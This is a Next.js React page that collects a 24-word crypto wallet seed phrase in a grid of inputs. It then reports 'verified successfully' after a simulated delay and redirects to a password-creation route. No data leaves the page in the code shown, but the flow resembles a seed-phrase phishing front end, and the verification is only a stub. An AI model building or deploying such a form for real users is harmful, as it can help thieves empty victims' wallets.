'use client';

import React, { useState } from 'react';
import { useRouter } from 'next/navigation';
import { toast, ToastContainer } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

// --- HELPER & SIMULATED SHADCN/UI COMPONENTS ---
const cn = (...classes: (string | undefined | null | false)[]): string => classes.filter(Boolean).join(' ');

const Input = React.forwardRef<HTMLInputElement, React.InputHTMLAttributes<HTMLInputElement>>(({ className, ...props }, ref) => (
    <input
        className={cn(
            "flex h-12 w-full rounded-lg border border-slate-700 bg-slate-800 px-4 py-2 text-sm text-center text-gray-200 placeholder:text-gray-500",
            "focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-blue-500",
            className
        )}
        ref={ref}
        {...props}
    />
));
Input.displayName = 'Input';


// --- UI COMPONENTS ---

const RecoveryPhraseCard = () => {
    const [recoveryWords, setRecoveryWords] = useState<string[]>(Array(24).fill(''));
    const [isLoading, setIsLoading] = useState(false);
    const router = useRouter();

    const handleWordChange = (index: number, value: string) => {
        const newWords = [...recoveryWords];
        newWords[index] = value;
        setRecoveryWords(newWords);
    };

    const validateRecoveryPhrase = () => {
        const emptyFields = recoveryWords.filter(word => !word.trim()).length;
        
        if (emptyFields > 0) {
            toast.error(`Please fill in all 24 recovery words. ${emptyFields} field(s) remaining.`);
            return false;
        }
        
        // Check for minimum word length
        const invalidWords = recoveryWords.filter(word => word.trim().length < 3);
        if (invalidWords.length > 0) {
            toast.error('Each recovery word must be at least 3 characters long.');
            return false;
        }
        
        return true;
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        
        if (!validateRecoveryPhrase()) {
            return;
        }

        setIsLoading(true);
        
        try {
            // Simulate API call to validate recovery phrase
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Success message
            toast.success('Recovery phrase verified successfully! Redirecting to create new password...');
            
            // Redirect to create new password page
            setTimeout(() => {
                router.push('/createnewpassword');
            }, 1500);
            
        } catch (error) {
            toast.error('Invalid recovery phrase. Please check your words and try again.');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className="w-full max-w-2xl bg-[#1E293B] border border-slate-800 rounded-2xl shadow-2xl p-8 md:p-12" style={{ padding: '60px' }}>
            <div className="text-center">
                <h1 className="text-3xl font-bold text-white mb-3">24-word recovery</h1>
                <p className="text-gray-400 text-sm mb-10" style={{ marginBottom: '50px', marginTop: '20px' }}>
                    Enter the recovery words of your seed phrase
                </p>
            </div>
            
            <form onSubmit={handleSubmit}>
                <div className="grid grid-cols-4 gap-4">
                    {Array.from({ length: 24 }, (_, i) => i + 1).map((number, index) => (
                        <Input 
                            key={number}
                            type="text" 
                            value={recoveryWords[index]}
                            onChange={(e) => handleWordChange(index, e.target.value)}
                            placeholder={`No ${number}`}
                            disabled={isLoading}
                        />
                    ))}
                </div>

                <button
                    type="submit"
                    disabled={isLoading}
                    className="w-full mt-10 bg-blue-600 text-white font-semibold h-12 rounded-lg text-base hover:bg-blue-700 disabled:bg-slate-600 disabled:cursor-not-allowed transition-colors shadow-lg shadow-blue-600/20 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-slate-900 focus:ring-blue-500"
                    style={{ marginTop: '50px' }}
                >
                    {isLoading ? 'Verifying...' : 'Confirm'}
                </button>
            </form>
        </div>
    );
};


// --- MAIN PAGE ---

export default function RecoveryPhrasePage() {
  return (
    <div className="min-h-screen w-full bg-[#0F172A] text-gray-200 flex flex-col items-center justify-center p-4 font-sans">
      <style jsx global>{`
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        .font-sans { font-family: 'Inter', sans-serif; }
        body {
            background-color: #0F172A;
            background-image: radial-gradient(circle at top right, rgba(30, 64, 175, 0.1), transparent 50%), radial-gradient(circle at bottom left, rgba(30, 64, 175, 0.1), transparent 50%);
        }
      `}</style>
      
      <main className="flex-grow flex items-center justify-center w-full">
          <RecoveryPhraseCard />
      </main>

      {/* Toast Container */}
      <ToastContainer
        position="top-right"
        autoClose={3000}
        hideProgressBar={false}
        newestOnTop={false}
        closeOnClick
        rtl={false}
        pauseOnFocusLoss
        draggable
        pauseOnHover
        theme="dark"
        toastStyle={{
          backgroundColor: '#1E293B',
          color: '#F1F5F9',
          border: '1px solid #475569'
        }}
      />
    </div>
  );
}

